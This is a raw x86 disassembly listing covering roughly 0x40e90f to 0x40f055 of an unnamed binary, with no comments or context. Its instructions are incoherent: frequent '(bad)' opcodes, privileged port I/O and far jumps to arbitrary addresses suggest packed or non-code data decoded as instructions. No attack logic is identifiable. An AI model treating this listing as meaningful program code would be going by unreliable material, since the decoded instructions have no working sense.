  40e90f:	xor    eax,0xa9ac5b9
  40e914:	mov    dl,0xe3
  40e916:	xchg   DWORD PTR [edi-0x7e7ea6d],ebp
  40e91c:	mov    bl,al
  40e91e:	dec    esi
  40e91f:	sub    BYTE PTR [ecx+0x2999aca8],bh
  40e925:	mov    DWORD PTR [edx+0x8],esi
  40e928:	add    BYTE PTR [ebx+0x68],0x65
  40e92c:	ret    0x6552
  40e92f:	seta   BYTE PTR [edx]
  40e932:	push   0x12
  40e934:	mov    ah,0x8f
  40e936:	mov    bl,0xeb
  40e938:	xor    dh,BYTE PTR [edi-0x45]
  40e93b:	and    eax,0xf9640af9
  40e940:	inc    esp
  40e941:	dec    ebx
  40e942:	xor    BYTE PTR [edx+edi*2-0x3b9a7010],dh
  40e949:	mov    ch,0xb5
  40e94b:	retf   0x2341
  40e94e:	or     dh,BYTE PTR [ebx]
  40e950:	fs pushaw 
  40e953:	in     al,dx
  40e954:	iret   
  40e955:	in     al,dx
  40e956:	hlt    
  40e957:	cmp    ecx,esi
  40e959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e95a:	push   es
  40e95b:	add    BYTE PTR [edx-0x6b432c93],dh
  40e961:	jne    0x40e974
  40e963:	or     ebx,esi
  40e965:	test   DWORD PTR [edi-0x4149a860],esi
  40e96b:	adc    esp,esi
  40e96d:	hlt    
  40e96e:	adc    eax,0x4ada0726
  40e973:	lods   al,BYTE PTR ds:[esi]
  40e974:	ret    
  40e975:	xlat   BYTE PTR ds:[ebx]
  40e976:	por    mm2,QWORD PTR [ecx]
  40e979:	jge    0x40e9f3
  40e97b:	cmp    ebx,ecx
  40e97d:	nop
  40e97e:	sub    al,dl
  40e980:	aas    
  40e981:	not    BYTE PTR [ecx+0x44c1567b]
  40e987:	jmp    0x87fe:0xb5a104bf
  40e98e:	and    ebx,eax
  40e990:	in     eax,dx
  40e991:	int3   
  40e992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e993:	imul   DWORD PTR [edi-0x3a]
  40e996:	(bad)  
  40e997:	pop    ebp
  40e998:	mov    WORD PTR [ebp+0x22ec91c5],fs
  40e99e:	mov    ah,0x2d
  40e9a0:	mov    edx,0x158097b8
  40e9a5:	repnz push edx
  40e9a7:	call   0x3219:0xb278ae6d
  40e9ae:	sti    
  40e9af:	jnp    0x40e9f5
  40e9b1:	imul   esi,DWORD PTR [eax-0x75374f4c],0xffffff9c
  40e9b8:	pop    ebx
  40e9b9:	lea    ebp,[edx]
  40e9bb:	mov    cl,0xaf
  40e9bd:	inc    esi
  40e9be:	dec    ecx
  40e9bf:	mov    ch,0x38
  40e9c1:	and    al,0xda
  40e9c3:	cmp    eax,DWORD PTR [eax-0x30]
  40e9c6:	loopne 0x40e99d
  40e9c8:	fwait
  40e9c9:	jmp    0x89cf613f
  40e9ce:	(bad)  
  40e9cf:	(bad)  
  40e9d0:	fadd   QWORD PTR [edx-0x284c809]
  40e9d6:	mov    WORD PTR [edi-0x53],cs
  40e9d9:	dec    ebx
  40e9da:	(bad)  
  40e9db:	popa   
  40e9dc:	lahf   
  40e9dd:	cmc    
  40e9de:	fidiv  DWORD PTR [ebx+0x6279e05d]
  40e9e4:	js     0x40e9ff
  40e9e6:	cmc    
  40e9e7:	mov    edi,ecx
  40e9e9:	fisub  DWORD PTR [esi]
  40e9eb:	pop    esp
  40e9ec:	and    DWORD PTR [esi+0x40],ebp
  40e9ef:	in     eax,0xc5
  40e9f1:	pop    ds
  40e9f2:	mov    eax,0xdd9c827c
  40e9f7:	jmp    0xe40b:0x52c67a90
  40e9fe:	in     eax,0x2e
  40ea00:	jl     0x40ea81
  40ea02:	inc    eax
  40ea03:	sbb    BYTE PTR [esi],dh
  40ea05:	or     ecx,ecx
  40ea07:	push   cs
  40ea08:	cmp    eax,0x185bfd2c
  40ea0d:	mov    dh,0x7b
  40ea0f:	sub    esi,DWORD PTR [edi-0x763c6fdb]
  40ea15:	add    BYTE PTR [esi-0x406c9771],ah
  40ea1b:	mov    edi,0x42654ee6
  40ea20:	dec    esi
  40ea21:	pop    esp
  40ea22:	mov    esi,0xe34814e8
  40ea27:	pop    es
  40ea28:	outs   dx,BYTE PTR ds:[esi]
  40ea29:	out    0x1c,eax
  40ea2b:	add    eax,0x41da213c
  40ea30:	pop    ecx
  40ea31:	xor    DWORD PTR [ebp+0x7678818a],eax
  40ea37:	ja     0x40ea40
  40ea39:	jg     0x40e9cb
  40ea3b:	popf   
  40ea3c:	(bad)  
  40ea3d:	mov    bl,0x3
  40ea3f:	data16 add BYTE PTR [edi-0x3d],0xd8
  40ea44:	push   ss
  40ea45:	push   0xffffffcb
  40ea47:	pop    ebp
  40ea48:	retf   0x4e57
  40ea4b:	test   BYTE PTR [edx],ah
  40ea4d:	dec    ebx
  40ea4e:	inc    edx
  40ea4f:	dec    esi
  40ea50:	or     BYTE PTR [edx+0x19],al
  40ea53:	push   es
  40ea54:	sbb    BYTE PTR [eax-0x71],cl
  40ea57:	adc    edi,DWORD PTR [edi]
  40ea59:	xchg   DWORD PTR [eax],eax
  40ea5b:	and    eax,0x22e77796
  40ea60:	popf   
  40ea61:	or     DWORD PTR [esi],esp
  40ea63:	mov    ah,0x5e
  40ea65:	jg     0x40eaa5
  40ea67:	popf   
  40ea68:	ins    DWORD PTR es:[edi],dx
  40ea69:	outs   dx,DWORD PTR ds:[esi]
  40ea6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea6b:	daa    
  40ea6c:	jb     0x40eab9
  40ea6e:	iret   
  40ea6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea70:	or     al,0x10
  40ea72:	adc    ebp,DWORD PTR [eax-0x7b4da91f]
  40ea78:	mov    esi,0xcd60e159
  40ea7d:	(bad)  
  40ea7e:	sar    esp,cl
  40ea80:	cdq    
  40ea81:	int    0x51
  40ea83:	cwde   
  40ea84:	mov    ebp,0x1f6c4277
  40ea89:	jmp    0x9a8b6342
  40ea8e:	push   0xef04aa30
  40ea93:	pop    esp
  40ea94:	jle    0x40ea5e
  40ea96:	sub    al,0x4
  40ea98:	iret   
  40ea99:	xchg   esp,eax
  40ea9a:	xchg   DWORD PTR [ebp+0x1aa417ea],esi
  40eaa0:	aas    
  40eaa1:	pop    ds
  40eaa2:	add    ebp,esp
  40eaa4:	retf   0x2561
  40eaa7:	or     eax,0xda84904c
  40eaac:	mov    eax,ds:0x1f3431b8
  40eab1:	idiv   DWORD PTR [edx-0x6f1d37c8]
  40eab7:	test   al,0xd1
  40eab9:	addr16 push ds
  40eabb:	bound  edx,QWORD PTR [ebx]
  40eabd:	jl     0x40ead3
  40eabf:	ds mov ?,WORD PTR ds:[ebx-0x44]
  40eac4:	nop
  40eac5:	dec    edi
  40eac6:	stc    
  40eac7:	sbb    eax,0xb04b1936
  40eacc:	xor    BYTE PTR [esi+0x53],ah
  40eacf:	push   ecx
  40ead0:	push   edx
  40ead1:	adc    dl,ch
  40ead3:	aas    
  40ead4:	call   0x21bf:0x94028bf8
  40eadb:	and    cl,BYTE PTR [ebp-0xf4c5b18]
  40eae1:	mov    ebx,0x433c3c67
  40eae6:	shr    DWORD PTR [ebx+0x2bceb27],0x91
  40eaed:	xor    DWORD PTR [ebx-0x33],esp
  40eaf0:	rol    dh,1
  40eaf2:	sbb    eax,0xa3aaea66
  40eaf7:	popa   
  40eaf8:	inc    eax
  40eaf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eafa:	or     al,0x3c
  40eafc:	dec    eax
  40eafd:	dec    ebp
  40eafe:	jecxz  0x40eae3
  40eb00:	cli    
  40eb01:	add    BYTE PTR [eax+esi*8-0x28],cl
  40eb05:	or     ebx,DWORD PTR [edx]
  40eb07:	bound  ebx,QWORD PTR [ebx+0x15]
  40eb0a:	and    al,0x8d
  40eb0c:	outs   dx,BYTE PTR ds:[esi]
  40eb0d:	sbb    esi,0x34eed7d6
  40eb13:	sbb    al,0xd
  40eb15:	jns    0x40eac9
  40eb17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb18:	push   edi
  40eb19:	mov    al,0x13
  40eb1b:	pop    ebp
  40eb1c:	in     eax,0x18
  40eb1e:	js     0x40eb7d
  40eb20:	or     DWORD PTR [ebx],ecx
  40eb22:	and    eax,0xf07ae230
  40eb27:	call   0x4a4aae0d
  40eb2c:	ror    DWORD PTR [ecx],cl
  40eb2e:	jmp    0x40eb98
  40eb30:	sub    bh,al
  40eb32:	mov    ebx,0x82c4ea84
  40eb37:	cwde   
  40eb38:	popf   
  40eb39:	test   BYTE PTR ds:[edi+0x6e],dh
  40eb3d:	ficom  WORD PTR [ebx+0x54f7a710]
  40eb43:	mov    edi,0x52b054c7
  40eb48:	jo     0x40eacd
  40eb4a:	sbb    eax,0xa02b1688
  40eb4f:	add    DWORD PTR ds:0xfbc89e09,edi
  40eb55:	mov    edx,0x4bb6020b
  40eb5a:	popa   
  40eb5b:	loope  0x40eb2e
  40eb5d:	push   0x1c
  40eb5f:	and    edx,0xc41160e8
  40eb65:	(bad)  
  40eb66:	fistp  WORD PTR [ebx]
  40eb68:	call   0x7174:0xed0658ed
  40eb6f:	out    0xb0,al
  40eb71:	and    ch,BYTE PTR [ecx]
  40eb73:	lods   al,BYTE PTR ds:[esi]
  40eb74:	(bad)  
  40eb75:	jne    0x40eb45
  40eb77:	(bad)  
  40eb78:	pop    edi
  40eb79:	jcxz   0x40eb91
  40eb7c:	leave  
  40eb7d:	loopne 0x40ebea
  40eb7f:	mov    ah,0x4e
  40eb81:	push   0xf3f5a00
  40eb86:	or     bh,BYTE PTR [ebp+0x13cc27f2]
  40eb8c:	cmp    eax,edx
  40eb8e:	sub    ch,BYTE PTR [edi+0x2b]
  40eb91:	pop    edi
  40eb92:	push   0xb2805bc2
  40eb97:	sub    BYTE PTR [ecx],dh
  40eb99:	push   ecx
  40eb9a:	push   0x22
  40eb9c:	add    eax,0xbfe34373
  40eba1:	fs shl bl,0xd7
  40eba5:	mov    ds:0xc6a12900,al
  40ebaa:	inc    eax
  40ebab:	xchg   ebp,eax
  40ebac:	pop    ebp
  40ebad:	jmp    0xb238:0xf46a1d1c
  40ebb4:	dec    edi
  40ebb5:	shufps xmm4,xmm5,0xa3
  40ebb9:	not    DWORD PTR [ebx]
  40ebbb:	shl    BYTE PTR [esi+0x3d0fb567],cl
  40ebc1:	test   BYTE PTR [ecx+0x3],bh
  40ebc4:	jle    0x40eb47
  40ebc6:	addr16 mov cl,bh
  40ebc9:	adc    DWORD PTR [ebx+eax*4-0x34],ebp
  40ebcd:	push   esi
  40ebce:	jo     0x40ebf2
  40ebd0:	icebp  
  40ebd1:	or     BYTE PTR [ebp-0x41],0xad
  40ebd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebd6:	test   edi,edi
  40ebd8:	sub    al,0x8f
  40ebda:	pop    ecx
  40ebdb:	in     al,0xd0
  40ebdd:	(bad)  
  40ebde:	fmulp  st(0),st
  40ebe0:	mov    ?,WORD PTR [eax-0x462902b5]
  40ebe6:	gs scas al,BYTE PTR es:[edi]
  40ebe8:	sbb    DWORD PTR [esi-0x4a],0x45
  40ebec:	inc    esp
  40ebed:	cmp    eax,0x467d2bd2
  40ebf2:	cli    
  40ebf3:	repz int 0x58
  40ebf6:	(bad)  
  40ebf7:	jmp    0x2e80:0x6d27979d
  40ebfe:	fmul   QWORD PTR [esi]
  40ec00:	enter  0x622,0x2a
  40ec04:	int3   
  40ec05:	fstp   QWORD PTR [ecx]
  40ec07:	stos   DWORD PTR es:[edi],eax
  40ec08:	sbb    edi,DWORD PTR ds:0xff52bed4
  40ec0e:	not    BYTE PTR [edi]
  40ec10:	lods   al,BYTE PTR ds:[esi]
  40ec11:	fisubr WORD PTR [edi]
  40ec13:	nop
  40ec14:	add    al,0x2c
  40ec16:	or     eax,0x4796789f
  40ec1b:	mov    ebp,DWORD PTR [esi]
  40ec1d:	jb     0x40ec83
  40ec1f:	jae    0x40ebe6
  40ec21:	push   ss
  40ec22:	mov    ds:0x5d72174a,eax
  40ec27:	or     eax,DWORD PTR [eax+0x42]
  40ec2a:	pop    edx
  40ec2b:	xchg   ebx,eax
  40ec2c:	cmp    DWORD PTR [ebp-0x531ea235],esp
  40ec32:	fist   DWORD PTR [edi]
  40ec34:	ss jge 0x40ec16
  40ec37:	mov    ebx,DWORD PTR [ecx]
  40ec39:	jo     0x40ec54
  40ec3b:	and    eax,0x89222622
  40ec40:	(bad)  
  40ec41:	(bad)  
  40ec42:	pop    eax
  40ec43:	push   edx
  40ec44:	mov    bh,0xb3
  40ec46:	pusha  
  40ec47:	(bad)  
  40ec48:	(bad)  
  40ec49:	add    ah,ah
  40ec4b:	lods   al,BYTE PTR es:[esi]
  40ec4d:	cmp    eax,DWORD PTR [edi+ecx*8-0x1f06c402]
  40ec54:	jbe    0x40ec01
  40ec56:	cmp    ebp,DWORD PTR [edi+edi*2-0x1b]
  40ec5a:	retf   
  40ec5b:	int3   
  40ec5c:	xchg   DWORD PTR [edi+0x16],ebx
  40ec5f:	mov    ds:0x1b71cf71,eax
  40ec64:	jp     0x40ec74
  40ec66:	sub    eax,0xbd90940f
  40ec6b:	xchg   BYTE PTR [ebx-0x3f],ch
  40ec6e:	mov    al,0xf7
  40ec70:	mov    ds:0x9c1d8740,eax
  40ec75:	cli    
  40ec76:	mov    esp,0x8a8d5702
  40ec7b:	mov    ds:0x1b2a1adb,al
  40ec80:	jmp    0x40ec87
  40ec82:	lods   al,BYTE PTR ds:[esi]
  40ec83:	adc    BYTE PTR [ecx],bl
  40ec85:	sar    BYTE PTR [ebp+0x5c],cl
  40ec88:	pop    ss
  40ec89:	ja     0x40ec36
  40ec8b:	les    esi,FWORD PTR [ebp+0x23]
  40ec8e:	cwde   
  40ec8f:	xchg   ebp,eax
  40ec90:	sub    ah,BYTE PTR [ebx]
  40ec92:	cmp    al,0x68
  40ec94:	jae    0x40ed10
  40ec96:	jmp    0xfdce:0x333a5416
  40ec9d:	shl    DWORD PTR [ecx+0x3f78d190],cl
  40eca3:	out    0xe8,eax
  40eca5:	pusha  
  40eca6:	xchg   ebx,eax
  40eca7:	jae    0x40ec3a
  40eca9:	mov    bh,0x84
  40ecab:	pop    esi
  40ecac:	jns    0x40ed0a
  40ecae:	adc    ebx,DWORD PTR [eax+eax*2]
  40ecb1:	mov    ah,0x20
  40ecb3:	sti    
  40ecb4:	sbb    ah,BYTE PTR [esi]
  40ecb6:	inc    ebx
  40ecb7:	in     eax,0xdd
  40ecb9:	sub    BYTE PTR [esp+edi*8+0x508561c4],al
  40ecc0:	fs pop es
  40ecc2:	in     eax,dx
  40ecc3:	test   eax,0xf0b054f9
  40ecc8:	push   cs
  40ecc9:	and    ebp,DWORD PTR [ebx]
  40eccb:	into   
  40eccc:	std    
  40eccd:	retf   
  40ecce:	mov    ah,dh
  40ecd0:	(bad)  
  40ecd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecd2:	and    ebx,DWORD PTR [edi+0x1ad76272]
  40ecd8:	xor    al,BYTE PTR [edi]
  40ecda:	js     0x40ecfb
  40ecdc:	test   DWORD PTR [esi+0x650ec43a],ebp
  40ece2:	mov    edi,0xde3a05f8
  40ece7:	nop
  40ece8:	xchg   ebx,eax
  40ece9:	lahf   
  40ecea:	and    al,0xf7
  40ecec:	push   ss
  40eced:	jb     0x40ed21
  40ecef:	mov    ebx,0x57a14327
  40ecf4:	xchg   ebx,eax
  40ecf5:	pop    edi
  40ecf6:	lods   eax,DWORD PTR ds:[esi]
  40ecf7:	outs   dx,BYTE PTR ds:[esi]
  40ecf8:	fstp   DWORD PTR [ebx-0x53]
  40ecfb:	mov    eax,ds:0x120ca89d
  40ed00:	jp     0x40ecd6
  40ed02:	dec    ebp
  40ed03:	retf   
  40ed04:	daa    
  40ed05:	push   ss
  40ed06:	add    ebx,DWORD PTR [ecx+0x7da6d47c]
  40ed0c:	jmp    0x4bcd:0x1d1b4b40
  40ed13:	or     ah,BYTE PTR [edx+0x4bc3b053]
  40ed19:	adc    esi,esi
  40ed1b:	xor    ebx,eax
  40ed1d:	scas   al,BYTE PTR es:[edi]
  40ed1e:	inc    esi
  40ed1f:	int    0x78
  40ed21:	push   ds
  40ed22:	ins    DWORD PTR es:[edi],dx
  40ed23:	add    BYTE PTR [edx],al
  40ed25:	ds inc ebp
  40ed27:	jle    0x40ed2e
  40ed29:	stos   DWORD PTR es:[edi],eax
  40ed2a:	jae    0x40eda3
  40ed2c:	adc    edx,DWORD PTR [edx+ecx*1-0x3d7e9532]
  40ed33:	dec    ebx
  40ed34:	loope  0x40ecd7
  40ed36:	xchg   esi,eax
  40ed37:	int3   
  40ed38:	dec    edi
  40ed39:	mov    bh,0x6e
  40ed3b:	fnsave [ebp-0x1dd918e7]
  40ed41:	cmp    BYTE PTR [edi-0x1ff96984],dl
  40ed47:	cmp    BYTE PTR [ebx],0xed
  40ed4a:	hlt    
  40ed4b:	stos   DWORD PTR es:[edi],eax
  40ed4c:	adc    al,0xf9
  40ed4e:	test   ax,0xea2c
  40ed52:	fdiv   QWORD PTR [ecx-0x7c54076f]
  40ed58:	fwait
  40ed59:	adc    BYTE PTR [ebp+0x2ef24362],dh
  40ed5f:	mul    BYTE PTR [ecx+ecx*1+0x7b]
  40ed63:	xor    al,0x11
  40ed65:	ja     0x40ecf1
  40ed67:	dec    eax
  40ed68:	xor    BYTE PTR [ebp+edx*8+0x29662915],dl
  40ed6f:	fmul   QWORD PTR [ebx+0xcb21c7f]
  40ed75:	jnp    0x40ed0d
  40ed77:	fwait
  40ed78:	or     al,0x3e
  40ed7a:	jge    0x40ed54
  40ed7c:	pop    ss
  40ed7d:	mov    dh,0x58
  40ed7f:	pop    edi
  40ed80:	ss mov edx,0xdeaa1ee4
  40ed86:	fwait
  40ed87:	adc    BYTE PTR [eax],ah
  40ed89:	test   al,0xb3
  40ed8b:	push   edi
  40ed8c:	xchg   BYTE PTR ds:0x56218cb4,cl
  40ed92:	mov    edi,0xa280b0cc
  40ed97:	outs   dx,BYTE PTR ds:[esi]
  40ed98:	push   ebx
  40ed99:	retf   0x5494
  40ed9c:	cmc    
  40ed9d:	outs   dx,BYTE PTR ds:[esi]
  40ed9e:	pop    eax
  40ed9f:	xchg   esi,eax
  40eda0:	cmp    al,BYTE PTR [eax-0x3e]
  40eda3:	push   es
  40eda4:	jbe    0x40edca
  40eda6:	cs mov ebp,eax
  40eda9:	xchg   edx,eax
  40edaa:	push   esp
  40edab:	int3   
  40edac:	push   cs
  40edad:	mov    bl,0x20
  40edaf:	out    0x62,eax
  40edb1:	iret   
  40edb2:	or     ah,ah
  40edb4:	push   DWORD PTR [edx-0x5a5ce215]
  40edba:	test   al,0xb0
  40edbc:	aas    
  40edbd:	push   ecx
  40edbe:	xor    BYTE PTR [ecx+0x18],bh
  40edc1:	clc    
  40edc2:	jle    0x40ed54
  40edc4:	push   es
  40edc5:	add    ecx,DWORD PTR [edx]
  40edc7:	aaa    
  40edc8:	mov    ecx,0x733b14ac
  40edcd:	dec    ebp
  40edce:	push   eax
  40edcf:	mov    edi,0xb433c29f
  40edd4:	add    al,ch
  40edd6:	xchg   edi,eax
  40edd7:	scas   eax,DWORD PTR es:[edi]
  40edd8:	enter  0xb1f2,0x5f
  40eddc:	cmp    ecx,DWORD PTR [ecx+0x44f6d9ed]
  40ede2:	out    dx,eax
  40ede3:	dec    edi
  40ede4:	add    cl,BYTE PTR [edx+eax*4+0x35]
  40ede8:	into   
  40ede9:	pop    es
  40edea:	clc    
  40edeb:	ins    BYTE PTR es:[edi],dx
  40edec:	cmp    DWORD PTR [ecx+0x3f50f5ab],esp
  40edf2:	daa    
  40edf3:	jle    0x40eddd
  40edf5:	ins    DWORD PTR es:[edi],dx
  40edf6:	push   es
  40edf7:	pop    ecx
  40edf8:	arpl   WORD PTR ds:0xaa04cf51,di
  40edfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edff:	mov    dh,0x9f
  40ee01:	jnp    0x40ee81
  40ee03:	fdiv   DWORD PTR [eax]
  40ee05:	push   ecx
  40ee06:	les    esp,FWORD PTR [ecx+ebx*8-0x4a]
  40ee0a:	idiv   BYTE PTR [ebx+0x69b70b22]
  40ee10:	xchg   BYTE PTR [ebp+eax*2+0x2],cl
  40ee14:	mov    dl,0x5e
  40ee16:	or     BYTE PTR [ebp-0x64],ch
  40ee19:	inc    ebx
  40ee1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee1b:	call   0x1ee9:0x154bf230
  40ee22:	or     eax,0x5c6d2fe4
  40ee27:	fsub   st,st(4)
  40ee29:	in     al,0xee
  40ee2b:	mov    edi,0x850b7eb3
  40ee30:	iret   
  40ee31:	sub    al,0xcb
  40ee33:	sub    DWORD PTR ds:0xc66671b4,edx
  40ee39:	arpl   WORD PTR [eax+0x1b],cx
  40ee3c:	or     BYTE PTR [ecx+0x26],cl
  40ee3f:	mov    cs,edx
  40ee41:	clc    
  40ee42:	pop    esi
  40ee43:	sar    DWORD PTR [ecx-0x68],0x48
  40ee47:	xchg   ecx,eax
  40ee48:	loop   0x40edd9
  40ee4a:	retf   
  40ee4b:	sbb    BYTE PTR [edx+0x570beb4d],cl
  40ee51:	lahf   
  40ee52:	xor    DWORD PTR [eax-0x30faa738],eax
  40ee58:	mov    DWORD PTR [eax+0x26],edi
  40ee5b:	test   DWORD PTR [ebp-0x4545886d],ebx
  40ee61:	call   0x74638e9c
  40ee66:	mov    bh,0x7b
  40ee68:	sub    BYTE PTR [ebx],bh
  40ee6a:	pop    ss
  40ee6b:	adc    BYTE PTR [ebx],0x93
  40ee6e:	or     ebp,DWORD PTR [ecx-0x2a]
  40ee71:	aam    0x2e
  40ee73:	in     eax,0x24
  40ee75:	aas    
  40ee76:	scas   al,BYTE PTR es:[edi]
  40ee77:	iret   
  40ee78:	jl     0x40ee4b
  40ee7a:	scas   al,BYTE PTR es:[edi]
  40ee7b:	mov    ch,0xf4
  40ee7d:	mov    esi,0xa0faed39
  40ee82:	mov    bl,0xea
  40ee84:	pop    esi
  40ee85:	mov    ah,0x92
  40ee87:	loop   0x40ee6e
  40ee89:	fbld   TBYTE PTR [ebx+0x54c18032]
  40ee8f:	mov    ds:0x7acce0d3,al
  40ee94:	add    BYTE PTR [esi-0x45b8da39],0x7b
  40ee9b:	push   ds
  40ee9c:	and    ch,BYTE PTR [ecx-0x79ff18b9]
  40eea2:	xchg   edi,eax
  40eea3:	mov    esi,0xa598eab1
  40eea8:	out    dx,al
  40eea9:	mov    eax,ds:0xc580a455
  40eeae:	mov    esi,0x74629b57
  40eeb3:	inc    edx
  40eeb4:	retf   0xeaf1
  40eeb7:	adc    ecx,DWORD PTR [edx]
  40eeb9:	mov    bh,0xcc
  40eebb:	pop    ss
  40eebc:	in     al,dx
  40eebd:	enter  0x98fb,0x7d
  40eec1:	outs   dx,BYTE PTR ds:[esi]
  40eec2:	mov    ecx,0x7167aa61
  40eec7:	adc    ah,BYTE PTR [edx*1+0x1cb22c81]
  40eece:	adc    al,0xef
  40eed0:	mov    cl,0x3d
  40eed2:	aam    0x2f
  40eed4:	mov    esp,0xfffcc657
  40eed9:	xchg   esi,eax
  40eeda:	pusha  
  40eedb:	(bad)  
  40eedc:	sti    
  40eedd:	sbb    dh,BYTE PTR [edx]
  40eedf:	jmp    0x84fdb533
  40eee4:	inc    edx
  40eee5:	jb     0x40ee98
  40eee7:	cmova  eax,DWORD PTR [eax+0x16303af9]
  40eeee:	xor    al,0x31
  40eef0:	xchg   ecx,eax
  40eef1:	aad    0x89
  40eef3:	sub    eax,0x3e617e79
  40eef8:	mov    ah,0x4d
  40eefa:	mov    DWORD PTR ds:0x8f46dd11,edx
  40ef00:	jns    0x40ef63
  40ef02:	xor    bl,BYTE PTR [esi]
  40ef04:	stc    
  40ef05:	xchg   edi,eax
  40ef06:	cmp    bl,BYTE PTR [edx+0x46]
  40ef09:	mov    ds:0x774ad2a8,al
  40ef0e:	inc    eax
  40ef0f:	cmp    bh,dl
  40ef11:	mov    edi,0x171b5ad1
  40ef16:	sub    bh,ah
  40ef18:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40ef1a:	jl     0x40eef9
  40ef1c:	(bad)  
  40ef1d:	fidiv  WORD PTR [ecx+eiz*8-0x46]
  40ef21:	hlt    
  40ef22:	in     eax,0x2b
  40ef24:	mov    ds:0x5a50536,al
  40ef29:	int    0xda
  40ef2b:	mov    bh,BYTE PTR [edi+0x458681af]
  40ef31:	jae    0x40eed8
  40ef33:	(bad)  
  40ef34:	test   eax,0xe72277a5
  40ef39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef3a:	repz sub al,0x95
  40ef3d:	sbb    DWORD PTR [ecx],0xda9fa1e9
  40ef43:	pop    edx
  40ef44:	int3   
  40ef45:	stos   DWORD PTR es:[edi],eax
  40ef46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef47:	add    DWORD PTR [ebp+0x552c74],edi
  40ef4d:	mov    cl,0xf2
  40ef4f:	(bad)  [edx]
  40ef51:	scas   al,BYTE PTR es:[edi]
  40ef52:	jbe    0x40efbe
  40ef54:	xor    BYTE PTR [edi+0x39],bl
  40ef57:	pusha  
  40ef58:	(bad)  
  40ef59:	loopne 0x40ef74
  40ef5b:	cmp    al,0xa1
  40ef5d:	mov    edx,gs
  40ef5f:	cli    
  40ef60:	pusha  
  40ef61:	or     DWORD PTR [eax-0x20ff8529],esi
  40ef67:	xchg   ecx,eax
  40ef68:	cwde   
  40ef69:	sub    al,0xcb
  40ef6c:	lods   al,BYTE PTR ds:[esi]
  40ef6d:	cmp    DWORD PTR [edx+0x75c680dc],ecx
  40ef73:	xchg   ecx,edx
  40ef75:	(bad)  
  40ef76:	push   ebp
  40ef77:	leave  
  40ef78:	or     bl,BYTE PTR [esi]
  40ef7a:	out    0x43,al
  40ef7c:	sahf   
  40ef7d:	xor    eax,0xdbe71c56
  40ef82:	sbb    ah,BYTE PTR [edx+ebp*8+0x51]
  40ef86:	ds dec esi
  40ef88:	sti    
  40ef89:	xor    esp,DWORD PTR [eax-0x3a]
  40ef8c:	and    eax,0xdc004082
  40ef91:	call   0xbb8ad555
  40ef96:	mov    ch,0xaf
  40ef98:	mov    al,ds:0x54941dd
  40ef9d:	in     eax,dx
  40ef9e:	mov    edi,0x3fd5688c
  40efa3:	pop    esi
  40efa4:	(bad)  
  40efa5:	repz ret 0x3794
  40efa9:	int    0xc8
  40efab:	cld    
  40efac:	sub    bh,0xef
  40efaf:	xchg   BYTE PTR [esi+0x4a],dl
  40efb2:	into   
  40efb3:	call   0xedd556b8
  40efb8:	outs   dx,DWORD PTR ds:[esi]
  40efb9:	and    DWORD PTR [ecx+0x4a],ebx
  40efbc:	jbe    0x40ef8f
  40efbe:	push   edi
  40efbf:	lods   eax,DWORD PTR ds:[esi]
  40efc0:	inc    eax
  40efc1:	push   ecx
  40efc2:	sub    DWORD PTR [eax],eax
  40efc4:	outs   dx,BYTE PTR ds:[esi]
  40efc5:	adc    BYTE PTR es:[esi],0xbb
  40efc9:	xchg   esp,eax
  40efca:	sub    al,0x2e
  40efcc:	sahf   
  40efcd:	scas   eax,DWORD PTR es:[edi]
  40efce:	xlat   BYTE PTR ds:[ebx]
  40efcf:	cmp    esp,DWORD PTR [esi+0x28]
  40efd2:	jb     0x40efed
  40efd4:	(bad)  
  40efd5:	xchg   ecx,eax
  40efd6:	pop    ds
  40efd7:	imul   edx,DWORD PTR [eax],0x885c2ea1
  40efdd:	sbb    DWORD PTR [esi-0x2a],0x3a
  40efe1:	jb     0x40f002
  40efe3:	mov    ch,0x4b
  40efe5:	sbb    al,0xfb
  40efe7:	(bad)  
  40efe8:	(bad)  
  40efe9:	cmc    
  40efea:	inc    ecx
  40efeb:	(bad)  
  40efec:	xor    eax,0x56ea459c
  40eff1:	or     DWORD PTR ds:0xc81ecf4,ebx
  40eff7:	xchg   ecx,eax
  40eff8:	or     cl,bh
  40effa:	imul   eax,DWORD PTR [ebx-0x5a179c0b],0xffffffa9
  40f001:	push   ss
  40f002:	pop    ss
  40f003:	cs lahf 
  40f005:	mov    al,ds:0x92628a14
  40f00a:	or     edi,eax
  40f00c:	xchg   edi,eax
  40f00d:	(bad)  
  40f00e:	adc    BYTE PTR gs:[edi+0x38],cl
  40f012:	in     eax,dx
  40f013:	add    eax,0xe0bde0d6
  40f018:	mov    ebp,0x6b0b623c
  40f01d:	mov    ecx,0x20ad0479
  40f022:	inc    esp
  40f023:	fs and al,0x2d
  40f026:	jp     0x40efca
  40f028:	jmp    0x40f07f
  40f02a:	pop    edx
  40f02b:	pop    ebx
  40f02c:	xor    dh,al
  40f02e:	(bad)  
  40f02f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f031:	xchg   ecx,eax
  40f032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f033:	mov    cl,0x2b
  40f035:	shl    esi,cl
  40f037:	jp     0x40f013
  40f039:	leave  
  40f03a:	ret    0x2998
  40f03d:	nop
  40f03e:	aas    
  40f03f:	mov    ecx,eax
  40f041:	mov    ds:0xd331fd1d,eax
  40f046:	xchg   esp,ebp
  40f048:	loop   0x40f00f
  40f04a:	rep lods al,BYTE PTR ds:[esi]
  40f04c:	pop    ds
  40f04d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f04e:	je     0x40f0a1
  40f050:	push   esi
  40f051:	retf   
  40f052:	into   
  40f053:	mov    bl,0x6c
  40f055:	push   esp
